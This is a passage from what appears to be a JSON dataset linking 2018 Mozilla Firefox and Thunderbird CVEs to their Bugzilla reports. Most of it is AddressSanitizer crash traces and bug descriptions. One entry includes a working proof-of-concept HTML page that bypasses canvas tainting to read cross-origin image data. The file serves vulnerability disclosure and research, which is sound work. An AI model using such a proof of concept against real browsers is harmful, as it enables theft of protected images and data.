/builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3315:13 #11 0x7f73fac5f60b in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:468:15 #12 0x7f73fac5f60b in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:560 #13 0x7f73fac4858e in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:620:12 #14 0x7f73fac4858e in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3458 #15 0x7f73fac2d85b in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447:12 #16 0x7f73fac6011e in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:587:15 #17 0x7f73fac61eb2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:633:10 #18 0x7f73f9d3550d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2979:12 #19 0x7f73f13e8efa in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:265:37 #20 0x7f73f26eae4a in void mozilla::dom::EventHandlerNonNull::Call<nsISupports*>(nsISupports* const&, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&, char const*, mozilla::dom::CallbackObject::ExceptionHandling, JS::Realm*) /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #21 0x7f73f26e82ce in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214:12 #22 0x7f73f269d445 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1106:52 #23 0x7f73f269f40c in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1308:15 #24 0x7f73f268226e in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:390:5 #25 0x7f73f268226e in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:424 #26 0x7f73f2680513 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:641:16 #27 0x7f73f2686fe8 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1156:11 #28 0x7f73f5316c06 in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1167:7 #29 0x7f73f81afe24 in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7151:21 #30 0x7f73f81aae97 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6942:7 #31 0x7f73f81b4327 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #32 0x7f73ed4da465 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1307:3 #33 0x7f73ed4d904c in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:850:14 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/base/nsINode.h:953:12 in GetParentNode Shadow bytes around the buggy address: 0x0c248000dd90: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248000dda0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fa 0x0c248000ddb0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c248000ddc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c248000ddd0: 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa =>0x0c248000dde0: fa fa fa fa fa fa fa fa fd fd fd fd fd[fd]fd fd 0x0c248000ddf0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c248000de00: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c248000de10: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c248000de20: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c248000de30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==15482==ABORTING"
      }
    ],
    "CVE-2018-18493": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1504452",
        "title": "heap-buffer-overflow write in add_line",
        "description": "Tested on: OS: Ubuntu 18.04 Firefox: Downloaded with fuzzfetch: :$ fuzzfetch --target firefox --os Linux --asan --fuzzing [2018-11-03 19:51:41] > Task ID: eKR8so7vRgyEkAmBz42SeA [2018-11-03 19:51:41] > Rank: 1541238293 [2018-11-03 19:51:41] > Changeset: ef27c14b46bf58f710753ae6bb6d2c01a8c3631f [2018-11-03 19:51:41] > Build ID: 20181103094453 Firefox executed with ffpuppet using prefs.js from: https://github.com/MozillaSecurity/fuzzdata/blob/master/settings/firefox/prefs-default.js The issue doesn't reproduce without the prefs.js. To reproduce, use system with at least 8GB of RAM. Original reproducer caused mozalloc_abort with 4GB RAM, I minimized the testcase on a machine with 8GB of RAM. ASAN-trace: ==94392==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7f2f4710c000 at pc 0x7f2f5b3ceb60 bp 0x7fffdcf23b70 sp 0x7fffdcf23b68 WRITE of size 4 at 0x7f2f4710c000 thread T0 #0 0x7f2f5b3ceb5f in add_line /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/ops/GrAAHairLinePathRenderer.cpp:695:30 #1 0x7f2f5b3ceb5f in (anonymous namespace)::AAHairlineOp::onPrepareDraws(GrMeshDrawOp::Target*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/ops/GrAAHairLinePathRenderer.cpp:989 #2 0x7f2f5b60286c in prepare /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/ops/GrOp.h:158:49 #3 0x7f2f5b60286c in GrRenderTargetOpList::onPrepare(GrOpFlushState*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrRenderTargetOpList.cpp:112 #4 0x7f2f5b5ba407 in GrOpList::prepare(GrOpFlushState*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrOpList.cpp:88:11 #5 0x7f2f5b597374 in GrDrawingManager::executeOpLists(int, int, GrOpFlushState*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrDrawingManager.cpp:386:17 #6 0x7f2f5b57d07c in GrDrawingManager::flush(GrSurfaceProxy*, int, GrBackendSemaphore*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrDrawingManager.cpp:304:23 #7 0x7f2f5b5877e4 in GrDrawingManager::prepareSurfaceForExternalIO(GrSurfaceProxy*, int, GrBackendSemaphore*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrDrawingManager.cpp:441:24 #8 0x7f2f5b5fcb2e in GrRenderTargetContext::prepareForExternalIO(int, GrBackendSemaphore*) /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/GrRenderTargetContext.cpp:1408:36 #9 0x7f2f51916dbd in mozilla::layers::PersistentBufferProviderBasic::ReturnDrawTarget(already_AddRefed<mozilla::gfx::DrawTarget>) /builds/worker/workspace/build/src/gfx/layers/PersistentBufferProvider.cpp:50:9 #10 0x7f2f55f61dd2 in mozilla::dom::CanvasRenderingContext2D::ReturnTarget(bool) /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1949:22 #11 0x7f2f55f6694c in mozilla::dom::CanvasRenderingContext2D::OnStableState() /builds/worker/workspace/build/src/dom/canvas/CanvasRenderingContext2D.cpp:1550:3 #12 0x7f2f5606538b in applyImpl<mozilla::dom::CanvasRenderingContext2D, void (mozilla::dom::CanvasRenderingContext2D::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1191:12 #13 0x7f2f5606538b in apply<mozilla::dom::CanvasRenderingContext2D, void (mozilla::dom::CanvasRenderingContext2D::*)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1197 #14 0x7f2f5606538b in mozilla::detail::RunnableMethodImpl<mozilla::dom::CanvasRenderingContext2D*, void (mozilla::dom::CanvasRenderingContext2D::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1242 #15 0x7f2f4e78fa67 in mozilla::CycleCollectedJSContext::ProcessStableStateQueue() /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:366:12 #16 0x7f2f4e792822 in mozilla::CycleCollectedJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/xpcom/base/CycleCollectedJSContext.cpp:431:3 #17 0x7f2f50c266e5 in XPCJSContext::AfterProcessTask(unsigned int) /builds/worker/workspace/build/src/js/xpconnect/src/XPCJSContext.cpp:1288:30 #18 0x7f2f4e9d8adf in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1302:24 #19 0x7f2f4e9e091d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:530:10 #20 0x7f2f4fc46eff in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:97:21 #21 0x7f2f4fb4325e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:325:10 #22 0x7f2f4fb4325e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:318 #23 0x7f2f4fb4325e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:298 #24 0x7f2f58ab94d3 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:158:27 #25 0x7f2f5cee1000 in nsAppStartup::Run() /builds/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:290:30 #26 0x7f2f5d1afa2e in XREMain::XRE_mainRun() /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4784:22 #27 0x7f2f5d1b2209 in XREMain::XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4929:8 #28 0x7f2f5d1b3ce3 in XRE_main(int, char**, mozilla::BootstrapConfig const&) /builds/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:5021:21 #29 0x56184ee2167c in do_main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:237:22 #30 0x56184ee2167c in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:329 #31 0x7f2f71aafb96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #32 0x56184ed46eec in _start (/dev/shm/firefox/firefox+0x2deec) 0x7f2f4710c000 is located 6144 bytes to the left of 208584-byte region [0x7f2f4710d800,0x7f2f471406c8) allocated by thread T0 here: #0 0x56184edef1b2 in realloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:165:3 #1 0x56184ee2299d in moz_xrealloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:93:20 #2 0x7f2f5bcb57fd in makeSpace /builds/worker/workspace/build/src/gfx/skia/skia/include/private/SkPathRef.h:472:46 #3 0x7f2f5bcb57fd in SkPathRef::growForVerb(int, float) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPathRef.cpp:677 #4 0x7f2f5bc8a24c in growForVerb /builds/worker/workspace/build/src/gfx/skia/skia/include/private/SkPathRef.h:77:30 #5 0x7f2f5bc8a24c in SkPath::moveTo(float, float) /builds/worker/workspace/build/src/gfx/skia/skia/src/core/SkPath.cpp:777 #6 0x7f2f5454f847 in MoveTo /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CanvasRenderingContext2D.h:320:21 #7 0x7f2f5454f847 in mozilla::dom::CanvasRenderingContext2D_Binding::moveTo(JSContext*, JS::Handle<JSObject*>, mozilla::dom::CanvasRenderingContext2D*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/CanvasRenderingContext2DBinding.cpp:4915 #8 0x379d8f364c74 (<unknown module>) #9 0x379d8ef8a4e1 (<unknown module>) SUMMARY: AddressSanitizer: heap-buffer-overflow /builds/worker/workspace/build/src/gfx/skia/skia/src/gpu/ops/GrAAHairLinePathRenderer.cpp:695:30 in add_line Shadow bytes around the buggy address: 0x0fe668e197b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe668e197c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe668e197d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe668e197e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0fe668e197f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0fe668e19800:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe668e19810: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe668e19820: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe668e19830: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe668e19840: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0fe668e19850: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==94392==ABORTING"
      }
    ],
    "CVE-2018-18498": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1500011",
        "title": "Unsafe use of CheckedInt32 in nsContentUtils::CalculateBufferSizeForImage",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:61.0) Gecko/20100101 Firefox/61.0 Steps to reproduce: This is the same issue as bug#1495011. nsresult nsContentUtils::CalculateBufferSizeForImage(const uint32_t& aStride, const IntSize& aImageSize, const SurfaceFormat& aFormat, size_t* aMaxBufferSize, size_t* aUsedBufferSize) { CheckedInt32 requiredBytes = CheckedInt32(aStride) * CheckedInt32(aImageSize.height); if (!requiredBytes.isValid()) { return NS_ERROR_FAILURE; } *aMaxBufferSize = requiredBytes.value(); *aUsedBufferSize = *aMaxBufferSize - aStride + (aImageSize.width * BytesPerPixel(aFormat)); return NS_OK; } https://searchfox.org/mozilla-central/source/dom/base/nsContentUtils.cpp#7863 requiredBytes is checked for an overflow, however a couple of lines later its raw unchecked value is used in arithmetic calculations again. Thus aUsedBufferSize can potentially overflow on x86 systems."
      }
    ],
    "CVE-2018-18505": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1087565",
        "title": "IPC Channel does not validate the listener.",
        "description": "We have have probably inherited CVE-2011-3079 from our import of Chromium's IPC code 5½ years ago. My understanding of this bug is: Chromium IPC endpoints have names, and knowing the name is sufficient to connect to it. These names were predictable and, on Windows, are reflected in the named pipe namespace which an untrusted process can traverse. The patch adds 32 bits of randomness to each name, and excludes that part from the pipe name on Windows. (Anyone with more knowledge of IPC is invited to correct this summary if needed.) There's also a patch on the bug which seems to not be directly related to the IPC issue itself, and has something to do with Windows security levels: https://crbug.com/117627#c18 +++ This bug was initially created as a clone of Bug #958895 +++ \"IPC Channel does not validate the listener.\" http://code.google.com/p/chromium/issues/detail?id=117627"
      }
    ],
    "CVE-2018-18511": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1526218",
        "title": "Tainted canvases can be rendered in a bitmap context",
        "description": "User Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.96 Safari/537.36 Steps to reproduce: If the crossorigin attribute is not specified for an image, the image may be rendered in a bitmap canvas; the data can be accessced by JavaScript. A proof of concept is shown below. <html><body> <script charset=\"utf-8\"> function getData() { createImageBitmap(this, 0, 0, this.naturalWidth, this.naturalHeight).then(function(bmap) { var can = document.createElement('canvas'); var ctx = can.getContext('bitmaprenderer'); ctx.transferFromImageBitmap(bmap); document.getElementById('result').textContent = can.toDataURL(); }); } </script> <img src=\"https://duckduckgo.com/assets/logo_homepage_mobile.normal.v107.png\" onload=\"getData.call(this)\"/> <br/><textarea readonly style=\"width:100%;height:10em\" id=\"result\"></textarea> </body></html> Actual results: The image, which should not be accessible to JavaScript from origins other than https://duckduckgo.com is in fact rendered in the tainted canvas and its base64-encoded contents are displayed. Images on external domains protected by cookies or IP whitelisting can therefore be stolen using Cross-site Request Forgery even if the target server does not give CORS access to other domains. Expected results: An error should have been thrown similar to the error shown when rendering tainted canvases in a 2D context: \"The operation is insecure.\""
      }
    ],
    "CVE-2018-18512": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1482659",
        "title": "startup crash in soundInitWavHdr playing sound file for new mail",
        "description": "For reasons unknown, this is has gone from obsurity in 52.x (almost zero crashes), to #3 crash for 60.0 - visually seen in the graph https://crash-stats.mozilla.com/signature/?product=Thunderbird&signature=soundInitWavHdr&date=%3E%3D2018-05-11T10%3A52%3A28.000Z&date=%3C2018-08-11T10%3A52%3A28.000Z&_columns=date&_columns=product&_columns=version&_columns=build_id&_columns=platform&_columns=reason&_columns=address&_columns=install_time&_sort=-date&page=1#summary which also shows this as a startup crash This bug was filed from the Socorro interface and is report bp-19d63b14-ab22-4b0d-ad96-156eb0180808. ============================================================= Top 10 frames of crashing thread: 0 winmm.dll soundInitWavHdr 1 winmm.dll soundLoadMemory 2 winmm.dll _EH_prolog3_catch_GS 3 winmm.dll mmWndProc 4 user32.dll _InternalCallWinProc 5 user32.dll UserCallWinProcCheckWow 6 user32.dll DispatchMessageWorker 7 user32.dll DispatchMessageA 8 winmm.dll mciwindow 9 kernel32.dll BaseThreadInitThunk ============================================================="
      }
    ],
    "CVE-2018-18513": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1533300",
        "title": "Upgrade NSS in Thunderbird to fix bug 1507135 and bug 1507174",
        "description": "Upgrade NSS in Thunderbird to fix bug 1507135 and bug 1507174"
      }
    ],
    "CVE-2018-5089": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1412420%2C1426783%2C1422389%2C1415598%2C1410134%2C1408017%2C1224396%2C1382366%2C1415582%2C1417797%2C1409951%2C1414452%2C1428589%2C1425780%2C1399520%2C1418854%2C1408276%2C1412145%2C1331209%2C1425612",
        "description": "Upgrade NSS in Thunderbird to fix bug 1507135 and bug 1507174"
      }
    ],
    "CVE-2018-5090": [
      {
        "url": "https://bugzilla.mozilla.org/buglist.cgi?bug_id=1413857%2C1412653%2C1418966%2C1427126%2C1412942%2C1401459%2C1364399%2C1382851%2C1423770%2C1401420%2C1281965%2C1389561%2C1409179%2C1416879%2C1421786%2C1426449%2C1416799%2C1400912%2C1415158%2C1415748%2C1415788%2C1371891%2C1415770%2C1416519%2C1413143%2C1418841%2C1384544%2C1410140%2C1411631%2C1412313%2C1412641%2C1412645%2C1412646%2C1412648%2C1261175",
        "description": "Upgrade NSS in Thunderbird to fix bug 1507135 and bug 1507174"
      }
    ],
    "CVE-2018-5091": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1423086",
        "title": "Use After Free in PeerConnectionImpl::DTMFSendTimerCallback_m()",
        "description": "Reproduction test case: UAF_DTMFSendTimerCallback_m_PoC.html Steps to reproduce: 1. Open UAF_DTMFSendTimerCallback_m_PoC.html in Firefox browser. 2. Firefox crashes in PeerConnectionImpl::DTMFSendTimerCallback_m() by accessing freed memory. ================================================================= ==9169==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000198b88 at pc 0x7f94ab7d4e10 bp 0x7ffc550cc950 sp 0x7ffc550cc948 READ of size 4 at 0x606000198b88 thread T0 (file:// Content) #0 0x7f94ab7d4e0f in IsEmpty /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTStringRepr.h:186:12 #1 0x7f94ab7d4e0f in mozilla::PeerConnectionImpl::DTMFSendTimerCallback_m(nsITimer*, void*) /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.cpp:3793 Firefox version: 59.0a1 (2017-12-04) (64-bit) OS: Ubuntu 14.04 LTS Stack trace: ================================================================= ==9169==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000198b88 at pc 0x7f94ab7d4e10 bp 0x7ffc550cc950 sp 0x7ffc550cc948 READ of size 4 at 0x606000198b88 thread T0 (file:// Content) #0 0x7f94ab7d4e0f in IsEmpty /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTStringRepr.h:186:12 #1 0x7f94ab7d4e0f in mozilla::PeerConnectionImpl::DTMFSendTimerCallback_m(nsITimer*, void*) /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.cpp:3793 #2 0x7f94a9b6a3d3 in nsTimerImpl::Fire(int) /builds/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:701:7 #3 0x7f94a9b39af9 in nsTimerEvent::Run() /builds/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:286:11 #4 0x7f94a9b4966e in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1033:14 #5 0x7f94a9b653f0 in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:508:10 #6 0x7f94aa9d7984 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:125:5 #7 0x7f94aa92e929 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #8 0x7f94aa92e929 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #9 0x7f94aa92e929 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #10 0x7f94b0d7f5ca in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:157:27 #11 0x7f94b549418b in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:865:22 #12 0x7f94aa92e929 in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:326:10 #13 0x7f94aa92e929 in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:319 #14 0x7f94aa92e929 in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:299 #15 0x7f94b5493b7d in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:691:34 #16 0x4ee9f5 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:63:30 #17 0x4ee9f5 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:280 #18 0x7f94c6244ec4 in __libc_start_main /build/buildd/eglibc-2.19/csu/libc-start.c:287 #19 0x41e078 in _start (/home/coder/FirefoxBuilds/firefox/firefox+0x41e078) 0x606000198b88 is located 40 bytes inside of 56-byte region [0x606000198b60,0x606000198b98) freed by thread T0 (file:// Content) here: #0 0x4bf212 in realloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:107:3 #1 0x4f000d in moz_xrealloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:106:20 #2 0x7f94a999c7dc in Realloc /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:214:12 #3 0x7f94a999c7dc in nsTArrayInfallibleAllocator::ResultTypeProxy nsTArray_base<nsTArrayInfallibleAllocator, nsTArray_CopyWithMemutils>::EnsureCapacity<nsTArrayInfallibleAllocator>(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray-inl.h:183 #4 0x7f94ab7d413c in AppendElements<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1705:49 #5 0x7f94ab7d413c in AppendElement<nsTArrayInfallibleAllocator> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1733 #6 0x7f94ab7d413c in mozilla::PeerConnectionImpl::InsertDTMF(mozilla::TransceiverImpl&, nsTSubstring<char16_t> const&, unsigned int, unsigned int) /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.cpp:2453 #7 0x7f94ad631a03 in InsertDTMF /builds/worker/workspace/build/src/media/webrtc/signaling/src/peerconnection/PeerConnectionImpl.h:422:10 #8 0x7f94ad631a03 in mozilla::dom::PeerConnectionImplBinding::insertDTMF(JSContext*, JS::Handle<JSObject*>, mozilla::PeerConnectionImpl*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/PeerConnectionImplBinding.cpp:483 #9 0x7f94aecc2ad7 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3042:13 #10 0x7f94b5761041 in CallJSNative /builds/worker/workspace/build/src/js/src/jscntxtinlines.h:291:15 #11 0x7f94b5761041 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:473 #12 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #13 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #14 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #15 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #16 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #17 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #18 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #19 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #20 0x7f94b57470a8 in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:528:12 #21 0x7f94b57470a8 in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3096 #22 0x7f94b5733810 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:423:12 #23 0x7f94b57614ce in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:495:15 #24 0x7f94b5761fd2 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, 